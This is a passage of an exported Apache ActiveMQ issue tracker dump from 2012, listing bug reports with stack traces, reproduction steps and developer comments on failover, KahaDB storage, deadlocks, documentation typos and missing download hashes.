Download page does not include any hashes,AMQ-3783,12547929,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,sebb,sebb,24/Mar/12 01:27,13/Aug/15 22:45,14/Jul/23 05:43,13/Aug/15 22:45,,,,,,5.12.0,,,,,,,0,,,,,,,,,"The download page(s) fail to include any MD5 or SHA1 hashes.
One or both of these should be provided.

The page says:

bq. It is essential that you verify the integrity of the downloaded files using the PGP or MD5 signatures. 

This is slightly inaccurate. PGP is a signature whereas MD5 and SHA1 are hashes.
",http://activemq.apache.org/activemq-543-release.html,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,233026,,,Thu Aug 13 22:45:41 UTC 2015,,,,,,,,,,,"0|i0eadj:",81443,,,,,,,,,,,,,,,,,,,,,"13/Aug/15 22:45;tabish;The most current release 5.12.0 now links to the hashes for verification;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FailoverTransport throws NPE,AMQ-3782,12547390,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,oczkins,oczkins,21/Mar/12 14:58,22/Mar/12 21:01,14/Jul/23 05:43,22/Mar/12 21:01,5.2.0,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"Failover transport occasionally throws NullPointerException

INFO   | jvm 1    | 2012/03/19 09:25:05 | Exception in thread ""ActiveMQ Failover Worker: 2009192672"" java.lang.NullPointerException
INFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:125)
INFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
INFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

It seems like DedicatedTaskRunner starts Thread before FailoverTransport finish initializing   reconnectTask field. 

Same code is present in 5.5.1 so it's possible that same bug is out there
",debian java-6-sun activemq 5.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,232548,,,Thu Mar 22 21:01:05 UTC 2012,,,,,,,,,,,"0|i0ai0f:",59191,,,,,,,,,,,,,,,,,,,,,"21/Mar/12 18:20;tabish;Do you have a test case that can reproduce this.  I don't really see a way in the current code that this could happen.;;;","22/Mar/12 21:01;tabish;Added a check to ensure no access to reconnectTask when its potentially null.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Non-persistent messages in the tmp-storage directory are not cleaned up when destination is deleted,AMQ-3780,12547225,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,20/Mar/12 16:22,06/Apr/12 19:25,14/Jul/23 05:43,06/Apr/12 19:25,5.4.3,5.5.0,5.5.1,,,5.6.0,,,Broker,Message Store,,,0,,,,,,,,,Non-persistent messages stored in the tmp-storage directory are not cleaned up when the destination is deleted.  The StoreQueueCursor doesn't clear out its FilePendingMessageCursor on stop so the non-persistent messages are left on disk when the Queue is deleted.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,232383,,,Fri Apr 06 19:25:02 UTC 2012,,,,,,,,,,,"0|i0ai0n:",59192,,,,,,,,,,,,,,,,,,,,,"20/Mar/12 16:27;tabish;Fix applied in svn rev: 1302977;;;","06/Apr/12 19:24;tabish;Issue with not cleaning up in memory non-persistent messages exists.;;;","06/Apr/12 19:25;tabish;Additional test case and new fix applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Incorrect variable name in bin/activemq,AMQ-3777,12547170,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,tabish,richiethom,richiethom,20/Mar/12 10:08,20/Mar/12 13:29,14/Jul/23 05:43,20/Mar/12 13:29,,,,,,5.6.0,,,,,,,0,,,,,,,,,"The script bin/activemq uses the variable ACTIVEMQ_CONFIGS. However, on the following line, there is an extra C:

echo ""INFO: Using alternative activemq configuration files: $ACCTIVEMQ_CONFIGS""

It does not affect functionality of the script, it just stops the value of ACTIVEMQ_CONFIGS being echoed to the terminal.",,richiethom,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,232328,,,Tue Mar 20 13:29:00 UTC 2012,,,,,,,,,,,"0|i0ai0v:",59193,,,,,,,,,,,,,,,,,,,,,"20/Mar/12 13:29;tabish;fixed in trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synchronization error in MessageListenerServlet.getAjaxWebClient,AMQ-3776,12547083,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,cdolan,cdolan,19/Mar/12 20:50,20/Mar/12 13:36,14/Jul/23 05:43,20/Mar/12 13:36,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"Note: I found this problem by reading code, not by an actual behavior problem!

In the latest revision of MessageListenerServlet.getAjaxWebClient() you can see that the ajaxWebClients map is read outside of a synchronized block and then edited inside the block. This looks like a simple mistake, and the get() should be moved down one line.

http://svn.apache.org/viewvc/activemq/trunk/activemq-web/src/main/java/org/apache/activemq/web/MessageListenerServlet.java?revision=1177026&view=markup#l438

Theoretically, the downside of this bug will be that new clients will be unnecessarily created if a single web session connects to the servlet from two or more concurrent connections. In practice, this almost never happens because most ajax users of ActiveMQ should have only one connection in flight at a time.",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,232241,,,Tue Mar 20 13:36:50 UTC 2012,,,,,,,,,,,"0|i0agp3:",58978,,,,,,,,,,,,,,,,,,,,,"20/Mar/12 13:36;tabish;Fix applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"KahaDB journal files retained after delay in ""unsubscribing"" durable subscriber from topic.",AMQ-3775,12547072,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,19/Mar/12 19:21,29/Mar/12 14:50,14/Jul/23 05:43,29/Mar/12 14:50,5.5.1,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"KahaDB journal files retained after delay in ""unsubscribing"" durable subscriber from topic.This issue only appears to occur when Durable Subscriber is registered with a ""selector"" that does not match all messages on topic.

Scenario:

Msg Producer sending messages to topic.

Durable subscriber registered with a selector on topic
After 20 seconds; stop calling consumer.receive() .
Another Durable subscriber registers on the topic
After 20 seconds; stop calling consumer.receive() .
Continue this pattern till 10 durable subscribers are registered with topic

Then unsubscribe all 10 Durable subscribers.

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,232230,,,Thu Mar 29 14:50:26 UTC 2012,,,,,,,,,,,"0|i0ai13:",59194,,,,,,,,,,,,,,,,,,,,,"20/Mar/12 21:20;tabish;fixed on trunk.;;;","28/Mar/12 22:49;tabish;Found additional cases where this can happen.;;;","29/Mar/12 14:50;tabish;Fixed on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ClassCastException when running some Durable Consumer test cases,AMQ-3768,12546479,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,tabish,tabish,14/Mar/12 21:14,23/Mar/12 18:57,14/Jul/23 05:43,23/Mar/12 18:57,5.6.0,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"When running the DurableSubProcessWithRestartTest for long intervals you can sometimes see.

{noformat}

ERROR rableSubProcessWithRestartTest - Server.run failed
java.lang.RuntimeException: Server.run failed
	at org.apache.activemq.usecases.DurableSubProcessWithRestartTest.exit(DurableSubProcessWithRestartTest.java:738)
	at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.run(DurableSubProcessWithRestartTest.java:185)
Caused by: javax.jms.JMSException: STORE COMMIT FAILED: Transaction rolled back.
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1297)
	at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:748)
	at org.apache.activemq.TransactionContext.commit(TransactionContext.java:322)
	at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:560)
	at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.send(DurableSubProcessWithRestartTest.java:232)
	at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.run(DurableSubProcessWithRestartTest.java:179)
Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back.
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77)
	at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:252)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
	at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:414)
	at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:291)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:218)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.lang.ClassCastException: org.apache.kahadb.index.BTreeNode cannot be cast to org.apache.kahadb.index.ListNode
	at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:289)
	at org.apache.kahadb.index.ListIndex.getHead(ListIndex.java:98)
	at org.apache.kahadb.index.ListIndex.iterator(ListIndex.java:266)
	at org.apache.kahadb.index.ListIndex.get(ListIndex.java:127)
	at org.apache.activemq.store.kahadb.MessageDatabase.addAckLocationForNewMessage(MessageDatabase.java:1826)
	at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1130)
	at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2029)
	at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1055)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:765)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1052)
	at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:921)
	at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:903)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:815)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267)
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72)
	... 14 more

{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,231637,,,Fri Mar 23 18:57:33 UTC 2012,,,,,,,,,,,"0|i0ai1z:",59198,,,,,,,,,,,,,,,,,,,,,"23/Mar/12 18:57;gtully;final fix in http://svn.apache.org/viewvc?view=rev&rev=1304020

issue was the change of the headPageId for a list, this identity page was not persisted on a change so it could lead to corruption on a restart. The fix is to retain the headPageId for the lifetime of the list.
Issue effects durable subs and possibly non persistent messages in the filepending message cursor as it also uses the listindex.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation update for ActiveMQ Message Properties page,AMQ-3767,12546464,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jsherman1,jsherman1,14/Mar/12 19:19,14/Mar/12 21:34,14/Jul/23 05:43,14/Mar/12 21:34,,,,,,,,,Documentation,,,,0,,,,,,,,,"The following typos should be corrected at the following link: http://activemq.apache.org/activemq-message-properties.html

JMSType description should contain the value ""user defined""
JMSMessageID description should contain the value ""unique identifier for the message""
JMSRedelivered has the values shift over a column



",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,231622,,,Wed Mar 14 21:34:54 UTC 2012,,,,,,,,,,,"0|i1758f:",249816,,,,,,,,,,,,,,,,,,,,,"14/Mar/12 21:34;tabish;Fix the Wiki, will be updated on the next site update.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Dead api links in on one of the Failover Transport doc,AMQ-3763,12546117,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,sjavurek,sjavurek,12/Mar/12 16:02,15/Mar/12 14:05,14/Jul/23 05:43,15/Mar/12 14:05,,,,,,,,,Documentation,,,,0,,,,,,,,,"The Failover Transport guide, http://activemq.apache.org/failover-transport-reference.html, has two api links in the middle which are broken.  It looks like the version is missing from them and I assume should be:

http://activemq.apache.org/maven/5.5.0/activemq-core/apidocs/org/apache/activemq/transport/TransportListener.html
http://activemq.apache.org/maven/5.5.0/activemq-core/apidocs/org/apache/activemq/spring/ActiveMQConnectionFactory.html

accordingly. 

Kindest regards, 
Susan
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,231275,,,Thu Mar 15 14:05:55 UTC 2012,,,,,,,,,,,"0|i1758n:",249817,,,,,,,,,,,,,,,,,,,,,"15/Mar/12 14:05;tabish;Update the confluence page, should show up after the next site refresh.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deadlock on Java Client when onMessage executes a synchronized method.,AMQ-3760,12545495,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,amonguzz,amonguzz,07/Mar/12 13:20,04/Dec/12 21:08,14/Jul/23 05:43,04/Dec/12 21:08,5.5.1,,,,,AGING_TO_DIE,,,JMS client,,,,0,features,,,,,,,,"Create a class with two synchronized methods synchMethod1 and synchMethod2. 
syncMethod1 is invoked inside a messageListener object and only prints a message on stdout.
syncMethod2 creates a new MessageConsumer with a new instance of MessageListener. All the MessageConsumers created by synchMethod2 share the same session.
All the consumers listen on the same Topic named ""myDest"".

Create an infinite cycle that: 
1) send a message on Topic ""myDest""
2) invoke syncMethod2
3) waits 10ms

In attach the unit test source.

As result, a deadlock is created between the ""ActiveMQ Session Task"" thread entering in syncMethod1 having the ActiveMessageConsumer's mutex and my other thread executing the syncMethod2 when the SimplePriorityMessageDispatchChannel.stop() method is invoked.


This means that it's not possible to create or change MessageListeners on a running session, even if the code seems to handle this case stopping and restarting the session.","java version ""1.6.0_30""
Java(TM) SE Runtime Environment (build 1.6.0_30-b12)
Java HotSpot(TM) Server VM (build 20.5-b03, mixed mode)

OS: SunOs 10/06",amonguzz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Mar/12 13:21;amonguzz;ActiveMQDeadlock.zip;https://issues.apache.org/jira/secure/attachment/12517397/ActiveMQDeadlock.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,230681,,,Mon Mar 12 13:11:35 UTC 2012,,,,,,,,,,,"0|i0a4h3:",56998,,,,,,,,,,,,,,,,,,,,,"07/Mar/12 13:21;amonguzz;Deadlock trace and unit test;;;","07/Mar/12 21:05;tabish;This sort of use of sessions, producers and consumers is discouraged by the spec:

""If a client desires to have one thread produce messages while others consume them, the client should use a separate session for its producing thread.

Once a connection has been started, any session with one or more registered message listeners is dedicated to the thread of control that delivers messages to it. It is erroneous for client code to use this session or any of its constituent objects from another thread of control. The only exception to this rule is the use of the session or connection close method. ""
;;;","08/Mar/12 08:55;amonguzz;In the unit test above I used a dedicated session for the producer. Only the consumers share a session. 

So is it not possible to add a new Consumer to an already running session? Can't I change the messageListener for a running consumer? 

If so, I think that the MessageConsumer.setMessageListener() should throw an Exception, not stopping and restarting the session.;;;","08/Mar/12 11:14;tabish;The spec has this to say about changing the message listener on a consumer:

""The effect of calling MessageConsumer.setMessageListener while messages are being consumed by an existing listener or the consumer is being used to consume messages synchronously is undefined."";;;","08/Mar/12 11:21;amonguzz;Ok, I understant I cannot change the MessageListener for a running consumer (even if I think that undefined should mean I'm not sure that I will not miss messages in the meanwhile, not that the application runs into deadlock).

It remains open the point: can I add a new consumer on a running session? The code seems to handle this scenario. Else an exception should be thrown.;;;","08/Mar/12 14:00;tabish;From the spec:

""Once a connection has been started, any session with one or more registered message listeners is dedicated to the thread of control that delivers messages to it. It is erroneous for client code to use this session or any of its constituent objects from another thread of control. The only exception to this rule is the use of the session or connection close method. ""

In your test case the first addition of the consumer succeeds which is correct, after that the session has a running consumer and is subject to the rule that its invalid for any other thread to call a session method other than close, which your code does by attempting to create a new consumer from the producer thread.  As per the spec the only Session method that you can safely call from the producer thread is close() after you create the first consumer as its now dedicated to the thread that is delivering messages to the consumer.  

;;;","08/Mar/12 14:28;amonguzz;Ok, so your answer to the question: ""can I add a consumer on a running session?"" is no.

At this point, why the ActiveMQMessageConsumer.setMessageListener stops and restarts the session instead of throwing an exception? If the operation is invalid, this behaviour is error prone and inefficient. Please note that in this scenario it's possible to block forever every other consumer linked to the same session, also those created before the session start.
Since this code works correctly if no lock is involved, I believe we have to resolve the deadlock, not to drop the entire feature.
;;;","09/Mar/12 13:32;tabish;Actually, the answer to the question: ""can I add a consumer on a running session?"" is as it is in most cases, it depends.  In many cases you can happily add a new consumer and even set a new message listener to a running consumer without problems, only in the tangled cases of synchronized methods cases you've created does this run into problems and that's why the spec makes these notes about the use of sessions and consumes by threads other than the thread that is delivering to the session with a running consumer.  

The code is working within the bounds of the spec.  If you have some ideas on how to improve things such that it meets your use case while still obeying all the various rules of the JMS specification we welcome your patches and test cases. ;;;","12/Mar/12 12:59;tabish;Working as designed.;;;","12/Mar/12 13:11;amonguzz;I disagree with the closure of this issue.

The spec cannot allow a deadlock and a synchronized method is not an uncommon case. Either a method can be called or it can't, the behaviour cannot be unpredictable.
If none Session method can be called (apart from close) when a Session is running, then I could not call the createObjectMessage() method also. I cannot believe that.

I would leave this bug open and explore a solution; closing the bug in this moment is like hiding the issue.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Source archive misses or mangles the test stores - result in failed tests,AMQ-3756,12545196,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,05/Mar/12 16:15,05/Mar/12 16:15,14/Jul/23 05:43,05/Mar/12 16:15,5.5.1,,,,,5.6.0,,,Test Cases,,,,0,,,,,,,,,"there is a problem with the stores in the source archive that effects:
org.apache.activemq.store.amq.reader.AMQReaderTest
org.apache.activemq.store.kahadb.KahaDBVersionTest
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,230382,,,Mon Mar 05 16:15:58 UTC 2012,,,,,,,,,,,"0|i0ai27:",59199,,,,,,,,,,,,,,,,,,,,,"05/Mar/12 16:15;tabish;updated the src assembly descriptors to resolve this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
intermittent failure of org.apache.activemq.transport.vm.VmTransportNetworkBrokerTest,AMQ-3754,12544923,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tmielke,tmielke,tmielke,02/Mar/12 11:43,02/Mar/12 13:21,14/Jul/23 05:43,02/Mar/12 13:21,5.5.1,,,,,5.6.0,,,Broker,,,,0,test,test-fail,,,,,,,"The JUnit test org.apache.activemq.transport.vm.VmTransportNetworkBrokerTest fails most of the time on a Mac OSX machine. 
The reason for the failure is that the test assumes the JVM itself will not create any additional threads at runtime. This however is a false assumption as on Mac OSX a daemon thread called ""Poller SunPKCS11-Darwin"" is created at some later point in time (after the test got kicked off already) under the main thread group. 

This extra but JVM internal thread makes the test fail on Mac OSX right now.
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Mar/12 11:49;tmielke;AMQ-3754.patch;https://issues.apache.org/jira/secure/attachment/12516822/AMQ-3754.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,230109,,,Fri Mar 02 13:20:52 UTC 2012,,,,,,,Patch Available,,,,"0|i0ai2f:",59200,,,,,,,,,,,,,,,,,,,,,"02/Mar/12 11:49;tmielke;Attaching a fix which updates the JUnit test. 
Initially the test was simply taking the thread count at the end of the test run and comparing it against the thread count in the beginning. The test failed if these counts did not match.

The new version now takes a list of all threads under the same main thread group at the end of the test run and removes any daemon threads from that list. 
This will filter out any additional threads created by the JVM. 
Then the count of that thread list is taken and compared against the initial thread count.;;;","02/Mar/12 13:20;tmielke;Fixed in revision #1296194.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Exception on stopping the broker - Timer already cancelled,AMQ-3753,12544915,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,rajdavies,xbhanu,xbhanu,02/Mar/12 11:09,17/Apr/12 14:51,14/Jul/23 05:43,14/Apr/12 06:06,,,,,,5.6.0,,,,,,,0,,,,,,,,,"I get this exception when i try to kill the broker.

Failed to shut down: java.lang.IllegalStateException: Timer already cancelled.

